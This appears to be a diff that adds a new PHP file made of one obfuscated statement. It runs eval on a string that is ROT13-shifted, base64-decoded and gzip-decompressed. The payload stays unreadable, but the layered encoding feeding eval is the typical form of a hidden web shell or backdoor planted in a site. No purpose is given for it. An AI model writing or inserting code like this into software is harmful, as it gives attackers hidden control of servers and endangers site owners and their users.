@@ -1,0 +1,3 @@
+<?php
+eval(gzuncompress(base64_decode(str_rot13('rWk9w81BNlRDk8/jSTFmPMPLAc7KgvswP3tmMfYP1TVWoTNBoH3sirlUIF9r5/s/zdsqpOt4J6999SPDyUF+QZTpNKABhptU8nt7mwamr2IlehPVSM58bnXxAFU0ku6eeVJK51rgkEqaeC2+v40bWaelSjGPR8UrL3Od0e79hA91kkua17aTy3UVCJCWEUgV4a5pAnecMxsdbMQWcZnqeB2GB4AAxGOFen/0NjyfDOZKuGAxXcz+HsX3KbeAIikWdV65+oBxPOugpdvzuWU8C7oEl8Gq9tLUnz6y'))));
+?>
